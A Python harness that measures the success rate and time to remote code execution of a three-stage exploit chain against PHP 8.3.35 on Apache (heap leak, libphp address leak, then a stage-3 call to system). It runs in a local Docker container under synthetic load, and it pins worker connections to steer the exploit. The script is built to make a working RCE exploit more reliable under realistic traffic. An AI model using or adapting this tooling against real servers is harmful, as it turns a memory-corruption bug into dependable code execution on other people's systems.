#!/usr/bin/env python3
"""Full-chain reliability measurement on a multi-worker PHP 8.3.35 server.

For each repetition: fresh full chain (stage-1 heap leak -> stage-2 libphp
leak -> aimed stage-3) against a container whose Apache worker count is set
by --conf. Optionally under synthetic background traffic (--load N workers
hammering the site). Measures success rate and time-to-RCE per repetition.

Local disposable container only.
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
import threading
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))
sys.path.insert(0, LAB)

from ka_target import KATarget  # noqa: E402

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

PROFILE = os.path.join(LAB, "profiles-ours", "8.3.35-bookworm-amd64.json")
HTDATA_OFF = 0x6A0D8


def start(image: str, port: int, name: str, conf: str) -> tuple[str, str]:
    M.docker("rm", "-f", name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", name))
    M.docker(
        "run", "-d", "--name", name,
        "-p", f"127.0.0.1:{port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{LAB}/php8335.ini:/usr/local/etc/php/conf.d/zz-mw.ini:ro",
        "-v", f"{conf}:/etc/apache2/conf-enabled/zz-mw.conf:ro",
        "-v", f"{outdir}:/out",
        image, timeout=900,
    )
    url = f"http://127.0.0.1:{port}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    return url, outdir


def hammer(url: str, stop: threading.Event, stats: dict) -> None:
    mod = _MOD
    t = mod.Target(url, verbose=False, timeout=10)
    while not stop.is_set():
        try:
            status, body = t.get("/index.php")
            stats["req"] += 1
            if status != 200:
                stats["err"] += 1
        except Exception:
            stats["err"] += 1
        time.sleep(0.01)


def hammer_ka(url: str, stop: threading.Event, stats: dict, delay: float) -> None:
    """Realistic traffic: ONE persistent keep-alive connection per client."""
    mod = _MOD
    ka = KATarget(mod.Target(url, verbose=False, timeout=10))
    while not stop.is_set():
        try:
            raw, alive = ka.request("GET", "/index.php", b"",
                                    "application/x-www-form-urlencoded")
            stats["req"] += 1
            if not raw.startswith(b"HTTP/1.1 200"):
                stats["err"] += 1
        except Exception:
            stats["err"] += 1
        time.sleep(delay)


def pool_pin(url: str, n: int, stop: threading.Event, release: threading.Event,
             stats: dict) -> None:
    """Hold n workers on idle keep-alive connections (2s heartbeats).
    When `release` is set, drop all pins so the accept queue drains."""
    mod = _MOD
    socks = []
    inner = mod.Target(url, verbose=False, timeout=10)
    ka = KATarget(inner)
    while len(socks) < n and not stop.is_set():
        try:
            raw, alive = ka.request("GET", "/index.php", b"",
                                    "application/x-www-form-urlencoded")
            if alive and ka.sock is not None:
                s, ka.sock = ka.sock, None   # steal the socket, open a new one
                socks.append(s)
                stats["pinned"] = len(socks)
        except Exception:
            time.sleep(0.2)
    while not stop.is_set() and not release.is_set():
        for s in list(socks):
            try:
                s.settimeout(3)
                s.sendall(b"GET /index.php HTTP/1.1\r\nHost: x\r\n"
                          b"Connection: keep-alive\r\n\r\n")
                s.recv(65536)
                stats["heartbeat"] += 1
            except OSError:
                socks.remove(s)
        time.sleep(2.0)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    stats["released"] = True


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--conf", required=True, help="apache conf path (worker count)")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--reps", type=int, default=10)
    ap.add_argument("--load", type=int, default=0, help="concurrent background clients")
    ap.add_argument("--load-ka", type=int, default=0,
                    help="concurrent keep-alive background clients (realistic)")
    ap.add_argument("--load-delay", type=float, default=0.01,
                    help="delay between background requests")
    ap.add_argument("--keepalive", action="store_true",
                    help="pin the whole chain to one keep-alive connection")
    ap.add_argument("--pool-pin", type=int, default=0,
                    help="hold this many workers on idle keep-alive connections")
    ap.add_argument("--no-rotate3", action="store_true",
                    help="do not rotate before stage 3 (keeps the pinned worker)")
    ap.add_argument("--release-before-s3", action="store_true",
                    help="drop pool pins right before stage 3 so the accept queue drains")
    ap.add_argument("--s3-retries", type=int, default=1,
                    help="stage-3 attempts per repetition (rotate between)")
    ap.add_argument("--label", required=True)
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    global _MOD
    _MOD = C.load_upstream(VENDOR)

    with open(PROFILE, encoding="utf-8") as fh:
        st = json.load(fh)["stages"]
    hints = {"stage1_n": st.get("stage1_n"), "stage1_len": st.get("stage1_forge_len"),
             "stage2_t": st.get("stage2_t"), "stage2_v": st.get("stage2_v", 16)}

    url, outdir = start("php:8.3.35-apache", args.port, args.name, args.conf)
    proof = os.path.join(outdir, "p1")
    workers = None
    try:
        n = M.docker(args.name, "ps -eo cmd 2>/dev/null | grep -c '[a]pache2'").strip()
        workers = max(int(n) - 1, 0) if n.isdigit() else None
    except Exception:
        pass
    print(f"[*] {args.label}: url={url} apache-workers={workers} load={args.load}")

    sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)

    stop = threading.Event()
    release = threading.Event()
    stats = {"req": 0, "err": 0}
    hammers = []
    if args.pool_pin:
        th = threading.Thread(target=pool_pin,
                              args=(url, args.pool_pin, stop, release, stats),
                              daemon=True)
        th.start()
        hammers.append(th)
        time.sleep(2.0)
    for _ in range(args.load):
        th = threading.Thread(target=hammer, args=(url, stop, stats), daemon=True)
        th.start()
        hammers.append(th)
    for _ in range(args.load_ka):
        th = threading.Thread(target=hammer_ka,
                              args=(url, stop, stats, args.load_delay), daemon=True)
        th.start()
        hammers.append(th)
    time.sleep(1.0)

    rows = []
    for rep in range(1, args.reps + 1):
        if os.path.exists(proof):
            os.unlink(proof)
        t0 = time.time()
        stage = "stage1"
        ok = False
        detail = ""
        try:
            t = mod.Target(url, verbose=False)
            if args.keepalive:
                t = KATarget(t)
            ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                             dtor_offset=sym["zval_ptr_dtor"], profile="bookworm",
                             verbose=False)
            chunk, n1, flen = C.calibrate_stage1(mod, ex, hints)
            if not chunk:
                detail = "no chunk leak"
            else:
                stage = "stage2"
                lib, t2 = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], hints)
                if not lib:
                    detail = f"no libphp leak (chunk={hex(chunk)})"
                else:
                    stage = "stage3"
                    os.environ["P2S_CARRIER_LEN"] = "15"
                    ex.stage3_carrier = True
                    ex.stage3_pads = [(31, 31)] * 6
                    if args.release_before_s3 and args.pool_pin:
                        release.set()
                        time.sleep(1.5)   # let the accept queue drain into freed workers
                    for att in range(1, args.s3_retries + 1):
                        if not args.no_rotate3:
                            ex.rotate()
                        ex.stage3(chunk + HTDATA_OFF, lib + sym["zif_system"])
                        if os.path.exists(proof) and os.path.getsize(proof) > 0:
                            break
                        detail = f"attempt {att}"
                    if os.path.exists(proof) and os.path.getsize(proof) > 0:
                        ok = True
                        detail = open(proof).read().strip()
                    else:
                        detail = f"stage3 no proof (chunk={hex(chunk)} lib={hex(lib)})"
        except Exception as exc:
            detail = f"exc@{stage}: {type(exc).__name__}: {exc}"
        dt = time.time() - t0
        rows.append({"rep": rep, "ok": ok, "stage": stage, "sec": round(dt, 1),
                     "detail": detail[:90]})
        print(f"  rep {rep}/{args.reps}: {'RCE' if ok else 'fail'} "
              f"({stage}, {dt:.1f}s) {detail[:60]}", flush=True)

    stop.set()
    for th in hammers:
        th.join(timeout=2)

    succ = sum(1 for r in rows if r["ok"])
    rec = {"label": args.label, "workers": workers, "load": args.load,
           "reps": args.reps, "successes": succ,
           "rate": round(succ / args.reps, 2),
           "median_sec": sorted(r["sec"] for r in rows)[len(rows) // 2],
           "bg_requests": stats["req"], "bg_errors": stats["err"],
           "rows": rows}
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(rec, fh, indent=2)
    print(f"[+] {args.label}: {succ}/{args.reps} RCE "
          f"(median {rec['median_sec']}s); wrote {args.out}")
    M.docker("rm", "-f", args.name)
    return 0


if __name__ == "__main__":
    sys.exit(main())
